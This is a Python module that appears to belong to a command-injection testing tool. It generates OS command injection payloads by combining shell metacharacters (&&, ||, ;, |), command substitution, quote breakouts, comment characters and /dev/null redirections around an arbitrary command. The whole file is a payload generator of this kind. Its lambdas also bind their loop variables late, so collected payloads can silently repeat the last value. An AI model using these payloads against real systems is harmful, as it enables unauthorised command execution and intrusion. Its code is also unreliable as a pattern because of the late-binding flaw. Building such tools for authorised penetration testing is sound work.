from typing import Generator, Callable

from raycharles.tampers import *

PayloadGenerator = Callable[[str], str]


COMMENT_CHARS = ("#",)
META_CHARS = ("&&", "||", "&", "|", ";")
QUOTE_CHARS = ("'", '"')
SUBSTITUTION_PATTERNS = ("$(%(cmd)s)", "`%(cmd)s`")
ENDINGS = (">/dev/null", "2>/dev/null")


def build_payloads() -> Generator[PayloadGenerator, None, None]:
    yield lambda cmd: cmd

    for sp in SUBSTITUTION_PATTERNS:
        yield lambda cmd: sp % {"cmd": cmd}

    for mc in META_CHARS:
        yield lambda cmd: mc + cmd

        for cc in COMMENT_CHARS:
            yield lambda cmd: mc + cmd + cc

        for end in ENDINGS:
            yield lambda cmd: end + mc + cmd

            for cc in COMMENT_CHARS:
                yield lambda cmd: end + mc + cmd + cc

    for qc in QUOTE_CHARS:
        for mc in META_CHARS:
            yield lambda cmd: qc + mc + cmd

            for cc in COMMENT_CHARS:
                yield lambda cmd: qc + mc + cmd + cc

            for end in ENDINGS:
                yield lambda cmd: qc + end + mc + cmd

                for cc in COMMENT_CHARS:
                    yield lambda cmd: qc + end + mc + cmd + cc
